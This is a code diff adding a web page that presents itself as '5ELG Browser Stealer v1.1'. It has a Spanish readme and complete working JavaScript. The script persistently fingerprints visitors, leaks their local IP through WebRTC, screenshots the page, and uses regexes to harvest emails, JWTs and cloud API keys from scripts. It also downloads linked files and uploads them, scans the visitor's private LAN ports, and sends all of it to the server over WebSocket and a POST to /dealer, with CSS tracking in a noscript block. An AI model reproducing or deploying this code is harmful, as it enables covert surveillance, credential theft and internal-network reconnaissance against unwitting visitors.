+{ route: "inteldata", data: { Fu, c: [ { file, emails, jwtTokens, apiKs } ] } }
+{ route: "netdata",   data: { Fu, c: { "192.168.1.1": { 80: "open" } } } }</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🌐</span>
+                    <span class="rm-title">Escáner de red — Detección de servicios en LAN</span>
+                    <span class="rm-tag" style="color:var(--purple);border-color:rgba(196,176,255,.3)">RED</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">Usando <code>fetch()</code> en modo <code>no-cors</code>, el stealer detecta puertos HTTP/HTTPS abiertos en IPs de la red privada del target desde dentro de su propio navegador.</p>
+                    <ul class="rm-list">
+                        <li><b>Rangos escaneados:</b> 192.168.0.x, 192.168.1.x, 10.0.0.x, 10.0.1.x, 172.16.0.x, 172.16.1.x (50 hosts por rango).</li>
+                        <li><b>Puertos:</b> 80, 443, 8080, 8443 por IP.</li>
+                        <li><b>Técnica:</b> Si <code>fetch()</code> lanza NetworkError → cerrado. Si responde (incluso con opaque response) → abierto.</li>
+                        <li><b>Resultados:</b> Enviados en tiempo real vía WebSocket canal <code>netdata</code> y en el Activity Log.</li>
+                    </ul>
+                    <div class="rm-note">Solo detecta servicios HTTP/HTTPS. SSH, SMTP, FTP, etc. no son detectables desde el browser con esta técnica.</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🗺️</span>
+                    <span class="rm-title">Flujo completo de ejecución</span>
+                    <span class="rm-tag" style="color:var(--text);border-color:rgba(255,255,255,.2)">OVERVIEW</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <div class="rm-code">t=0ms    → Página cargada, el script ejecuta
+t=1ms    → getFingerprintDataExtended() — recopila datos síncronamente
+t=2ms    → getDataFromAllStorages('u') — busca Fu en 5 storages
+t=~5ms   → Si no existe Fu → generateUserBrowserFingerprint() → SHA256
+t=~6ms   → storeDataInAllStorages('u', Fu) — persiste en los 5 storages
+t=~8ms   → connectWebSocket(wss://host/?u=Fu&b=Fb)
+t=~10ms  → html2canvas(document.body) — captura screenshot
+t=async  → navigator.getBattery() → estado de batería
+t=async  → navigator.mediaDevices.enumerateDevices() → lista dispositivos
+t=async  → RTCPeerConnection ICE → IP local leaked
+t=WS open → sendLinksAndScriptsToWebSocket()
+            → extractRoutes(document) → jsFiles, endpoints, others
+            → socket.send({route:'pwdata', ...})
+            → stealFile(Fu, uri) para cada "other"
+            → analyzeJavaScriptFiles(jsFiles)
+              → fetch(script) → findEmails/JWT/APIkeys
+              → socket.send({route:'inteldata', ...})
+t=done   → POST /dealer con payload completo + screenshot</div>
+                </div>
+            </div>
+
+            <div class="rm-section">
+                <div class="rm-head" onclick="toggleRm(this)">
+                    <span class="rm-icon">🌐</span>
+                    <span class="rm-title">APIs externas y librerías de terceros</span>
+                    <span class="rm-tag" style="color:var(--amber);border-color:rgba(255,208,112,.3)">ENRIQUECIMIENTO</span>
+                    <span class="rm-arrow">▶</span>
+                </div>
+                <div class="rm-body">
+                    <p class="rm-p">Además de la huella local, 5ELG enriquece cada sesión con datos de tres APIs de geo gratuitas (en cascada) y la librería open-source FingerprintJS — todo client-side, sin API key.</p>
+                    <div class="rm-grid">
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--blue)">🌍 ipwho.is (primaria)</div>
+                            <div class="rm-card-body">HTTPS + CORS abierto. Sin key ni registro. Devuelve: IP, ciudad, país, ISP, ASN, timezone, lat/lon.<br><br><code>GET https://ipwho.is/</code></div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--green)">📍 ip-api.com (fallback 1)</div>
+                            <div class="rm-card-body">Solo HTTP (HTTPS es de pago). Sin key. 45 req/min. Detecta proxy/VPN, móvil y hosting — muy útil para evaluación de riesgo.<br><br><code>GET http://ip-api.com/json/?fields=...</code></div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--purple)">☁ BigDataCloud (fallback 2)</div>
+                            <div class="rm-card-body">HTTPS, sin key, edge-deployed. Solo para uso desde el browser. Devuelve ISP, ASN, tipo de red. GDPR-compliant.<br><br><code>GET https://api.bigdatacloud.net/data/client-info</code></div>
+                        </div>
+                        <div class="rm-card">
+                            <div class="rm-card-title" style="color:var(--purple)">🔬 FingerprintJS v5 OSS</div>
+                            <div class="rm-card-body">Librería open-source de fingerprinting de Fingerprint Inc. Consulta 50+ atributos del browser y genera un <code>visitorId</code> con MurmurHash3. ~40–60% de precisión (solo client-side).<br><br><code>import 'https://openfpcdn.io/fingerprintjs/v5/iife.min.js'</code></div>
+                        </div>
+                    </div>
+                    <p class="rm-p">La <b>cascada geo</b> prueba las APIs en orden — si ipwho.is falla, recurre a ip-api.com (HTTP) y luego a BigDataCloud. El campo <code>fpjs</code> se incluye en el POST junto al <code>Fu</code> de 5ELG para comparación en el servidor.</p>
+                    <div class="rm-note">ip-api.com usa HTTP en su tier gratuito. En contextos HTTPS algunos browsers bloquean mixed-content — en ese caso se usa BigDataCloud (HTTPS) directamente.</div>
+                </div>
+            </div>
+
+        </div><!-- /lang-es -->
+
+    </div><!-- /readme -->
+
+</main>
+
+<footer class="site-footer">
+    <span style="color:var(--green)">5ELG</span>
+    <span style="color:rgba(255,255,255,.08)">·</span>
+    <span>BROWSER STEALER · FINGERPRINT INTELLIGENCE · v1.1</span>
+    <div class="footer-right"><span id="footer-fu" style="color:var(--dim2);font-family:Consolas,monospace;font-size:9px">—</span></div>
+</footer>
+
+<noscript>
+    <img src="/dealer/kid.png?unjs=true&u=img-ping&b=CSS_BLOCKING-DETECTED" style="display:none">
+    <style>
+        @font-face{font-family:'Ubuntu';  src:local('Ubuntu'),  url('/dealer/kid.png?unjs=true&u=cssTracking(ubuntu)&b=NOSCRIPT')  format('truetype');}
+        @font-face{font-family:'Calibri'; src:local('Calibri'), url('/dealer/kid.png?unjs=true&u=cssTracking(Linux)&b=NOSCRIPT')   format('truetype');}
+        @font-face{font-family:'MS UI Gothic';src:local('Roboto'),url('/dealer/kid.png?unjs=true&u=cssTracking(Windows)&b=NOSCRIPT') format('truetype');}
+        @supports(-webkit-app-region:inherit){.bs{background:url('/dealer/kid.png?unjs=true&u=cssTracking(ChromeBased)&b=NOSCRIPT')}}
+        @supports(-moz-appearance:inherit){.bs{background:url('/dealer/kid.png?unjs=true&u=cssTracking(FirefoxBased)&b=NOSCRIPT')}}
+        @supports(-apple-pay-button-style:inherit){.bs{background:url('/dealer/kid.png?unjs=true&u=cssTracking(Webkit)&b=NOSCRIPT')}}
+        @supports(-webkit-touch-callout:inherit){.bs{background:url('/dealer/kid.png?unjs=true&u=cssTracking(MobileWebkit)&b=NOSCRIPT')}}
+        @supports(-moz-osx-font-smoothing:inherit){.bs{background:url('/dealer/kid.png?unjs=true&u=cssTracking(MacGecko)&b=NOSCRIPT')}}
+        h1{font-family:"Calibri"} p{font-family:'MS UI Gothic'}
+    </style>
+    <div class="bs"></div>
+</noscript>
+
+<script>
+/* ════════════════════════════════════════════════════════════════
+   5ELG — BROWSER STEALER v1.1 (merch.js fully integrated)
+════════════════════════════════════════════════════════════════ */
+
+const DEALER_URI='./dealer',UPLOAD_URI='/upload/file';
+let velghost=window.location.host;
+const SHA256=new Hashes.SHA256();
+let userFingerprint=null,fingerprintData=null,extendedFingerprintData={},socket=null;
+
+const S={fu:'',fb:'',dl:'5ELG.DEALER',ip:'',fpjsVid:'',jd:null,jsFiles:[],links:[],other:[],emails:[],jwtTokens:[],apiKs:{},stolenFiles:0,intelFindings:0,startTs:new Date().toISOString(),sent:false,wsOpen:false,netScanning:false,progress:0};
+
+/* ── UI ── */
+function esc(s){return(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function set(id,v){const e=document.getElementById(id);if(e)e.textContent=String(v||'—');}
+function q(id){return document.getElementById(id);}
+function nowStr(){return new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'});}
+function fmtSize(b){if(!b)return'—';if(b>1048576)return(b/1048576).toFixed(1)+'MB';if(b>1024)return(b/1024).toFixed(1)+'KB';return b+'B';}
+
+let _lines=[];
+function log(msg,cls=''){
+    _lines.push({t:nowStr(),msg,cls});
+    if(_lines.length>400)_lines.shift();
+    set('term-count',_lines.length+' entries');
+    const body=q('term-body');if(!body)return;
+    body.innerHTML=_lines.map(l=>`<div class="tl"><span class="tt">${esc(l.t)}</span><span class="tm ${esc(l.cls)}">${esc(l.msg)}</span></div>`).join('');
+    body.scrollTop=body.scrollHeight;
+}
+function setProgress(pct,label){S.progress=pct;const f=q('prog-fill');if(f)f.style.width=pct+'%';if(label)set('prog-label',label);set('prog-pct',pct+'%');}
+function setChip(id,text,cls){const c=q(id);if(!c)return;c.className='chip'+(cls?' '+cls:'');const d=c.querySelector('.chip-dot');c.textContent='';if(d)c.appendChild(d.cloneNode());c.append(' '+text);}
+
+/* ── UPDATE UI ── */
+function updateUI(){
+    // FU hero — full hash, no truncation
+    const fuEl=q('p-fu-big');
+    if(fuEl){
+        fuEl.textContent=S.fu||'—';
+        fuEl.classList.toggle('empty',!S.fu);
+        fuEl.title=S.fu?'Click to copy Fu':'Generating fingerprint…';
+    }
+    const fbEl=q('p-fb-big');if(fbEl)fbEl.textContent=S.fb||'—';
+    set('p-dl-big',S.dl||'—');
+    set('p-ts-big',S.startTs.slice(0,16).replace('T',' '));
+    // Fu badge
+    const badge=q('fu-status-badge');
+    if(badge){
+        badge.textContent=S.sent?'✓ captured & sent':S.fu?'✓ captured':'generating…';
+        badge.style.color=S.sent?'var(--green)':S.fu?'var(--amber)':'var(--dim2)';
+        badge.style.borderColor=S.sent?'rgba(95,255,176,.4)':S.fu?'rgba(255,208,112,.4)':'rgba(255,255,255,.1)';
+    }
+    set('footer-fu','Fu: '+(S.fu||'—'));
+    set('status-ip','IP: '+(S.ip||'—'));
+    set('status-time',nowStr());
+    set('status-text',S.sent?'Payload sent ✓':S.fu?'Fu resolved':'Collecting…');
+    set('ascii-status',S.sent?'payload sent':S.fu?'active':'initializing…');
+    set('status-ws',S.wsOpen?'WS: connected':'WS: disconnected');
+    if(q('status-ws'))q('status-ws').style.color=S.wsOpen?'var(--green)':'var(--dim2)';
+    setChip('chip-sent',  S.sent?'Payload: sent ✓':'Payload: pending',   S.sent?'active':'');
+    setChip('chip-ws',    S.wsOpen?'WebSocket: open':'WebSocket: closed', S.wsOpen?'active':'');
+    setChip('chip-files', 'Files stolen: '+S.stolenFiles,                 S.stolenFiles>0?'warn':'');
+    setChip('chip-intel', 'Intel: '+S.intelFindings+' findings',          S.intelFindings>0?'danger':'');
+    setChip('chip-net',   S.netScanning?'Net scan: running…':'Net scan: idle', S.netScanning?'warn':'');
+    setChip('chip-store', 'Storage: written','active');
+}
+setInterval(()=>set('status-time',nowStr()),1000);
+
+/* ── LANG TABS ── */
+function switchLang(lang,tab){
+    document.querySelectorAll('.lang-tab').forEach(t=>t.classList.remove('active'));
+    document.querySelectorAll('.lang-content').forEach(c=>c.classList.remove('active'));
+    tab.classList.add('active');
+    const target=document.getElementById('lang-'+lang);
+    if(target)target.classList.add('active');
+}
+
+/* ── README TOGGLE ── */
+function toggleRm(head){
+    const body=head.nextElementSibling;
+    const open=body.classList.toggle('open');
+    head.classList.toggle('open',open);
+}
+
+/* ── MULTI-STORAGE ── */
+function objToString(obj){return Object.entries(obj).reduce((s,[k,v])=>`${s}${k}::${v}\n`,'');}
+function storeDataInAllStorages(key,value){
+    try{localStorage.setItem(key,value);}catch(e){}
+    try{sessionStorage.setItem(key,value);}catch(e){}
+    try{document.cookie=`${key}=${encodeURIComponent(value)}; path=/; SameSite=Strict;`;}catch(e){}
+    if('caches' in window){caches.open('5elg-cache').then(c=>{c.put(key,new Response(value,{headers:{'Content-Type':'text/plain'}})).catch(()=>{});}).catch(()=>{});}
+    if('indexedDB' in window){try{const req=indexedDB.open('5elg-db',1);req.onupgradeneeded=e=>{const db=e.target.result;if(!db.objectStoreNames.contains('store'))db.createObjectStore('store',{keyPath:'key'});};req.onsuccess=e=>{const db=e.target.result;const tx=db.transaction('store','readwrite');tx.objectStore('store').put({key,value});};}catch(e){}}
+}
+async function getDataFromAllStorages(key){
+    try{const v=localStorage.getItem(key);if(v!=null)return v;}catch(e){}
+    try{const v=sessionStorage.getItem(key);if(v!=null)return v;}catch(e){}
+    try{for(const c of document.cookie.split('; ')){const[k,v]=c.split('=');if(k===key)return decodeURIComponent(v);}}catch(e){}
+    if('caches' in window){try{const cache=await caches.open('5elg-cache');const r=await cache.match(key);if(r)return await r.text();}catch(e){}}
+    if('indexedDB' in window){try{return await new Promise((res)=>{const req=indexedDB.open('5elg-db',1);req.onupgradeneeded=e=>{const db=e.target.result;if(!db.objectStoreNames.contains('store'))db.createObjectStore('store',{keyPath:'key'});};req.onsuccess=e=>{const db=e.target.result;if(!db.objectStoreNames.contains('store')){res(null);return;}const tx=db.transaction('store','readonly');const gr=tx.objectStore('store').get(key);gr.onsuccess=e=>res(e.target.result?e.target.result.value:null);gr.onerror=()=>res(null);};req.onerror=()=>res(null);});}catch(e){}}
+    return null;
+}
+
+/* ── GPU ── */
+function getGpuModel(){const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');return gl?gl.getParameter(gl.RENDERER):'WebGL not supported';}
+
+/* ── LANGUAGE NORMALIZER ── */
+const LANG_MAP={af:'AF','af-za':'AF',sq:'SQ',ar:'AR',hy:'HY',az:'AZ',eu:'EU',be:'BE',bg:'BG',ca:'CA',zh:'ZH','zh-cn':'ZH','zh-tw':'ZH',hr:'HR',cs:'CS',da:'DA',nl:'NL',en:'EN','en-us':'EN','en-gb':'EN',et:'ET',fi:'FI',fr:'FR',gl:'GL',ka:'KA',de:'DE',el:'EL',gu:'GU',he:'HE',hi:'HI',hu:'HU',id:'ID',it:'IT',ja:'JA',kn:'KN',kk:'KK',ko:'KO',lv:'LV',lt:'LT',mk:'MK',ms:'MS',mr:'MR',mn:'MN',no:'NO',pl:'PL',pt:'PT','pt-br':'PT',ro:'RO',ru:'RU',sk:'SK',sl:'SL',es:'ES','es-es':'ES','es-mx':'ES',sv:'SV',th:'TH',tr:'TR',uk:'UK',ur:'UR',vi:'VI'};
+function normalizeLanguage(l){return LANG_MAP[(l||'').toLowerCase()]||(l||'').toUpperCase().slice(0,5);}
+function getPrimaryLanguage(){return normalizeLanguage(navigator.language||navigator.userLanguage||navigator.browserLanguage||'');}
+
+/* ── EXTENDED FINGERPRINT ── */
+function getFingerprintDataExtended(){
+    let data={};
+    data.browserPlugins=[...navigator.plugins].map(p=>`${p.name} ${p.version}`).join(';');
+    let deviceData={};
+    ['hardwareConcurrency','maxTouchPoints','platform','product','vendor','languages','deviceMemory'].forEach(k=>{deviceData[k]=navigator[k]!=null?navigator[k]:null;});
+    data.gpuData={colorDepth:screen.colorDepth,renderer:getGpuModel()};
+    let browserData={};
+    ['appCodeName','appName','appVersion','language','product','productSub','userAgent','onLine'].forEach(k=>{browserData[k]=navigator[k]!=null?navigator[k]:null;});
+    browserData.actualUri=location.href;
+    let perms={};
+    ['geolocation','accelerometer','camera','clipboard-read','clipboard-write','microphone','notifications','persistent-storage','payment-handler','midi'].forEach(p=>{navigator.permissions.query({name:p}).then(s=>{perms[p]=s.state;}).catch(()=>{});});
+    browserData.permissions=objToString(perms);
+    if(navigator.getBattery){navigator.getBattery().then(bat=>{browserData.batteryData={charging:bat.charging,chargingTime:bat.chargingTime,dischargingTime:bat.dischargingTime,level:bat.level};log('Battery: '+Math.round(bat.level*100)+'% '+(bat.charging?'charging':'discharging'),'info');}).catch(()=>{});}
+    if(navigator.mediaDevices){navigator.mediaDevices.enumerateDevices().then(devs=>{browserData.mediaDevices=devs.map(d=>`${d.kind}: ${d.label}`).join('; ');log('Media devices: '+devs.length+' found','info');}).catch(()=>{});}
+    try{const rtc=new RTCPeerConnection({iceServers:[]});rtc.createDataChannel('');rtc.createOffer().then(o=>rtc.setLocalDescription(o)).catch(()=>{});rtc.onicecandidate=function(ice){if(ice.candidate&&ice.candidate.candidate){browserData.rtcdata=ice.candidate.candidate;const m=ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);if(m){browserData.localIP=m[1];S.ip=m[1];updateUI();log('WebRTC local IP leaked: '+m[1],'warn');}}};}catch(e){}
+    try{if(navigator.connection){browserData.networkInfo={downlink:navigator.connection.downlink,effectiveType:navigator.connection.effectiveType,rtt:navigator.connection.rtt,saveData:navigator.connection.saveData};}}catch(e){}
+    try{window.addEventListener('deviceorientation',ev=>{browserData.deviceOrientation={alpha:ev.alpha,beta:ev.beta,gamma:ev.gamma};},{once:true});window.addEventListener('devicemotion',ev=>{browserData.deviceMotion={acceleration:ev.acceleration,rotationRate:ev.rotationRate,interval:ev.interval};},{once:true});}catch(e){}
+    try{if(performance&&performance.memory){browserData.memoryInfo={jsHeapSizeLimit:performance.memory.jsHeapSizeLimit,totalJSHeapSize:performance.memory.totalJSHeapSize,usedJSHeapSize:performance.memory.usedJSHeapSize};}}catch(e){}
+    try{browserData.touchCapabilities={maxTouchPoints:navigator.maxTouchPoints,touchEventSupported:'ontouchstart' in window,pointerEventSupported:'onpointerdown' in window};}catch(e){}
+    data.deviceData=deviceData;data.browserData=browserData;
+    return data;
+}
+
+/* ── FINGERPRINT HASH ── */
+function generateUserBrowserFingerprint(){return SHA256.hex(JSON.stringify({cookieEnabled:navigator.cookieEnabled,font:getComputedStyle(document.documentElement).fontSize,primaryLanguage:getPrimaryLanguage(),timezone:new Date().getTimezoneOffset()/-60,platform:navigator.platform}));}
+async function initializeFingerprints(){
+    log('Initializing fingerprints…','info');
+    extendedFingerprintData=getFingerprintDataExtended();S.jd=extendedFingerprintData;
+    userFingerprint=await getDataFromAllStorages('u');
+    if(!userFingerprint){userFingerprint=generateUserBrowserFingerprint();storeDataInAllStorages('u',userFingerprint);}
+    fingerprintData=await getDataFromAllStorages('f');
+    if(!fingerprintData){fingerprintData=SHA256.hex(JSON.stringify(userFingerprint));storeDataInAllStorages('f',fingerprintData);}
+    S.fu=userFingerprint;S.fb=fingerprintData;
+    log('Fu: '+userFingerprint,'ok');log('Fb: '+fingerprintData,'ok');
+    updateUI();
+}
+
+/* ── ROUTES ── */
+function extractRoutesFromDom(dom){
+    const routes={javascriptFiles:[],endpoints:[],others:[]};
+    const base=window.location.origin;
+    function norm(u){if(!u)return'';if(u.startsWith('http'))return u;if(u.startsWith('/'))return base+u;return u;}
+    function add(u){const f=norm(u);if(!f)return;if(f.endsWith('.js'))routes.javascriptFiles.push(f);else if(f.startsWith('http')&&!/\.[a-zA-Z0-9]{1,6}(\?|#|$)/.test(f.split('?')[0].split('#')[0]))routes.endpoints.push(f);else routes.others.push(f);}
+    dom.querySelectorAll('a[href]').forEach(a=>add(a.getAttribute('href')));
+    dom.querySelectorAll('form[action]').forEach(f=>add(f.getAttribute('action')));
+    dom.querySelectorAll('script[src]').forEach(s=>add(s.getAttribute('src')));
+    dom.querySelectorAll('link[href]').forEach(l=>add(l.getAttribute('href')));
+    dom.querySelectorAll('img[src]').forEach(i=>add(i.getAttribute('src')));
+    dom.querySelectorAll('iframe[src]').forEach(i=>add(i.getAttribute('src')));
+    (dom.body?.innerText.match(/https?:\/\/[^\s]+/g)||[]).forEach(add);
+    routes.javascriptFiles=[...new Set(routes.javascriptFiles)];
+    routes.endpoints=[...new Set(routes.endpoints)];
+    routes.others=[...new Set(routes.others)];
+    return routes;
+}
+function extractRoutes(){return extractRoutesFromDom(document);}
+
+/* ── INTEL ── */
+function findEmailAddresses(t){return[...new Set(t.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g)||[])];}
+function findJwtTokens(t){return[...new Set((t.match(/\beyJ[a-zA-Z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b/g)||[]).filter(tok=>{const p=tok.split('.');if(p.length!==3)return false;try{const h=JSON.parse(atob(p[0]));return['alg','typ','cty','kid','jku'].some(k=>h.hasOwnProperty(k));}catch{return false;}}))]; }
+function findApiKeys(t){const patterns={googleApiKey:/AIza[0-9A-Za-z\-_]{35}/g,amazonAccessKeyId:/AKIA[0-9A-Z]{16}/g,firebaseApiKey:/AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}/g,githubToken:/ghp_[0-9a-zA-Z]{36}/g,slackToken:/xox[baprs]-[0-9a-zA-Z]{10,48}/g};const found={};for(const[name,re] of Object.entries(patterns)){const m=t.match(re)||[];if(m.length)found[name]=[...new Set(m)];}return found;}
+async function analyzeJavaScriptFiles(files){
+    const results=[];
+    for(const file of files){try{const res=await fetch(file);const src=await res.text();const emails=findEmailAddresses(src),jwtTokens=findJwtTokens(src),apiKs=findApiKeys(src);results.push({file,emails,jwtTokens,apiKs});emails.forEach(e=>{if(!S.emails.includes(e)){S.emails.push(e);S.intelFindings++;}});jwtTokens.forEach(j=>{if(!S.jwtTokens.includes(j)){S.jwtTokens.push(j);S.intelFindings++;}});Object.assign(S.apiKs,apiKs);S.intelFindings+=Object.keys(apiKs).length;if(emails.length||jwtTokens.length||Object.keys(apiKs).length)log(`INTEL [${file.split('/').pop()}]: emails=${emails.length} jwt=${jwtTokens.length} api=${Object.keys(apiKs).length}`,'warn');}catch(e){}}
+    for(const s of document.querySelectorAll('script:not([src])')){const src=s.textContent||'';const emails=findEmailAddresses(src),jwtTokens=findJwtTokens(src),apiKs=findApiKeys(src);results.push({file:'inline-script',emails,jwtTokens,apiKs});emails.forEach(e=>{if(!S.emails.includes(e)){S.emails.push(e);S.intelFindings++;}});jwtTokens.forEach(j=>{if(!S.jwtTokens.includes(j)){S.jwtTokens.push(j);S.intelFindings++;}});Object.assign(S.apiKs,apiKs);S.intelFindings+=Object.keys(apiKs).length;}
+    updateUI();return results;
+}
+
+/* ── FILE EXFIL ── */
+async function uploadFile(id,filename,filecontent){const formData=new FormData();formData.append('file',new Blob([Uint8Array.from(atob(filecontent),c=>c.charCodeAt(0))],{type:'application/octet-stream'}),filename);try{const res=await fetch(`${UPLOAD_URI}?ID=${id}`,{method:'POST',body:formData});if(res.ok){S.stolenFiles++;log('File uploaded: '+filename.split('/').pop(),'warn');updateUI();}}catch(e){}}
+async function makeFileRequest(url){return new Promise(res=>{const xhr=new XMLHttpRequest();xhr.open('GET',url,true);xhr.responseType='arraybuffer';xhr.onload=function(){if(xhr.status===200){let binary='';const bytes=new Uint8Array(xhr.response);for(let i=0;i<bytes.byteLength;i+=1024)binary+=String.fromCharCode.apply(null,bytes.subarray(i,i+1024));res(btoa(binary));}else res(null);};xhr.onerror=()=>res(null);xhr.send();});}
+async function stealFile(id,uri){const data=await makeFileRequest(uri);if(data)await uploadFile(id,uri,data).catch(()=>{});}
+
+/* ── NET SCAN ── */
+async function scanPort(ip,port){try{await fetch(`http://${ip}:${port}`,{method:'GET',mode:'no-cors'});return{status:'open'};}catch(e){return{status:'closed'};}}
+async function scanIP(ip){const r={};for(const p of[80,443,8080,8443]){r[p]=await scanPort(ip,p);}return r;}
+async function scanPrivateNetworks(){
+    S.netScanning=true;updateUI();log('Network scan started…','net');
+    const ranges=['192.168.0.','192.168.1.','10.0.0.','10.0.1.','172.16.0.','172.16.1.'];
+    const open=[];
+    for(const range of ranges){for(let i=1;i<=50;i++){const ip=range+i;const r=await scanIP(ip);const openPorts=Object.entries(r).filter(([,v])=>v.status==='open').map(([p])=>p);if(openPorts.length){open.push({ip,ports:openPorts});log(`NET: ${ip} open ports: ${openPorts.join(',')}`,'warn');if(socket&&socket.readyState===WebSocket.OPEN)socket.send(JSON.stringify({route:'netdata',data:{Fu:S.fu,c:{[ip]:r}}}));}}}
+    S.netScanning=false;updateUI();log(`Net scan done — ${open.length} hosts with open ports`,'ok');return open;
+}
+function triggerNetScan(){if(S.netScanning){log('Net scan already running','warn');return;}Swal.fire({title:'Start Network Scan?',text:'Scans private IP ranges for open HTTP ports (80,443,8080,8443). May take several minutes.',icon:'warning',showCancelButton:true,confirmButtonText:'SCAN',cancelButtonText:'Cancel'}).then(r=>{if(r.isConfirmed)scanPrivateNetworks();});}
+
+/* ── WEBSOCKET ── */
+function connectWebSocket(){
+    try{
+        const wsUrl=`wss://${velghost}/?u=${encodeURIComponent(userFingerprint)}&b=${encodeURIComponent(fingerprintData)}`;
+        socket=new WebSocket(wsUrl);
+        socket.onopen=()=>{S.wsOpen=true;updateUI();log('WebSocket connected to '+velghost,'ok');sendLinksAndScriptsToWebSocket();};
+        socket.onmessage=ev=>{log('WS message: '+String(ev.data).slice(0,80),'info');};
+        socket.onclose=()=>{S.wsOpen=false;updateUI();log('WebSocket closed','dim');};
+        socket.onerror=()=>{S.wsOpen=false;updateUI();log('WebSocket error','err');};
+    }catch(e){log('WebSocket failed: '+e.message,'err');}
+}
+function sendLinksAndScriptsToWebSocket(){
+    try{
+        const result=extractRoutes();
+        S.jsFiles=result.javascriptFiles;S.links=result.endpoints;S.other=result.others;updateUI();
+        if(socket&&socket.readyState===WebSocket.OPEN){socket.send(JSON.stringify({route:'pwdata',data:{Fu:S.fu,c:{links:result.endpoints,jsFiles:result.javascriptFiles,other:result.others}}}));log('PWD sent via WS: '+result.javascriptFiles.length+' scripts, '+result.endpoints.length+' endpoints','info');}
+        for(const uri of result.others){stealFile(userFingerprint,uri).catch(()=>{});}
+        analyzeJavaScriptFiles(result.javascriptFiles).then(jsResults=>{if(socket&&socket.readyState===WebSocket.OPEN){socket.send(JSON.stringify({route:'inteldata',data:{Fu:S.fu,c:jsResults}}));log('INTEL sent via WS','ok');}updateUI();});
+    }catch(e){log('WS send error: '+e.message,'err');}
+}
+
+/* ── CAPTURE + POST ── */
+function captureAndSendData(){
+    setProgress(70,'Capturing screenshot…');
+    html2canvas(document.body,{logging:false,useCORS:true,allowTaint:true}).then(canvas=>{
+        const encodedImg=canvas.toDataURL().replace(/^data:image\/(png|jpg);base64,/,'');
+        const pageHTML=document.documentElement.outerHTML;
+        const encodedPageHTML=btoa(encodeURIComponent(pageHTML));
+        setProgress(85,'Sending payload…');
+        const payload=new URLSearchParams({u:userFingerprint,b:fingerprintData,r:SHA256.hex(JSON.stringify({ff:fingerprintData,tt:Date.now()})),Ua:navigator.userAgent,data:btoa(JSON.stringify(extendedFingerprintData)),code:encodeURIComponent(encodedPageHTML),ts:new Date().toISOString(),s:encodeURIComponent(encodedImg),fpjs:S.fpjsVid||''});
+        const xhr=new XMLHttpRequest();
+        xhr.open('POST',DEALER_URI,true);
+        xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+        xhr.onreadystatechange=function(){if(this.readyState===XMLHttpRequest.DONE&&this.status===200){S.sent=true;storeDataInAllStorages('u',userFingerprint);storeDataInAllStorages('f',fingerprintData);setProgress(100,'Complete — payload delivered ✓');log('Payload delivered ✓ ('+Math.round(payload.toString().length/1024)+'KB)','ok');updateUI();}};
+        xhr.onerror=()=>{log('POST network error','err');setProgress(85,'POST failed');};
+        xhr.send(payload.toString());
+        log('Payload POSTing to '+DEALER_URI,'info');
+    }).catch(e=>{log('Screenshot failed: '+e.message,'warn');setProgress(100,'Complete (no screenshot)');S.sent=true;updateUI();});
+}
+
+/* ════════════════════════════════════════════════════════
+   GEO IP ENRICHMENT — cascade: ipwho.is → ip-api.com → BigDataCloud
+════════════════════════════════════════════════════════ */
+function countryCodeToFlag(cc){
+    if(!cc||cc.length!==2)return'🌐';
+    return String.fromCodePoint(...[...cc.toUpperCase()].map(c=>c.charCodeAt(0)+127397));
+}
+function geoSet(id,v,cls){const e=document.getElementById(id);if(e){e.textContent=v||'—';if(cls)e.className='geo-v '+cls;}}
+
+async function fetchGeo(){
+    const badge=document.getElementById('geo-api-badge');
+    // ── API 1: ipwho.is (HTTPS, CORS open, no key) ──
+    try{
+        const r=await fetch('https://ipwho.is/',{cache:'no-store'});
+        if(r.ok){
+            const d=await r.json();
+            if(d.success){
+                applyGeo({
+                    ip:d.ip, city:d.city, region:d.region_code||d.region,
+                    country:d.country, countryCode:d.country_code,
+                    isp:d.connection?.isp||d.org||'—', asn:'AS'+(d.connection?.asn||'?'),
+                    timezone:d.timezone?.id||'—',
+                    lat:d.latitude, lon:d.longitude,
+                    proxy:null, mobile:null, hosting:null,
+                    source:'ipwho.is'
+                });
+                if(badge){badge.textContent='ipwho.is ✓';badge.className='api-badge ok';}
+                return;
+            }
+        }
+    }catch(e){log('Geo API 1 (ipwho.is) failed: '+e.message,'dim');}
+
+    // ── API 2: ip-api.com (HTTP only, CORS open, no key, 45 req/min) ──
+    try{
+        const r=await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query',{cache:'no-store'});
+        if(r.ok){
+            const d=await r.json();
+            if(d.status==='success'){
+                applyGeo({
+                    ip:d.query, city:d.city, region:d.regionName,
+                    country:d.country, countryCode:d.countryCode,
+                    isp:d.isp||d.org||'—', asn:d.as||'—',
+                    timezone:d.timezone,
+                    lat:d.lat, lon:d.lon,
+                    proxy:d.proxy, mobile:d.mobile, hosting:d.hosting,
+                    source:'ip-api.com'
+                });
+                if(badge){badge.textContent='ip-api.com ✓';badge.className='api-badge ok';}
+                return;
+            }
+        }
+    }catch(e){log('Geo API 2 (ip-api.com) failed: '+e.message,'dim');}
+
+    // ── API 3: BigDataCloud client-info (HTTPS, no key) ──
+    try{
+        const r=await fetch('https://api.bigdatacloud.net/data/client-info',{cache:'no-store'});
+        if(r.ok){
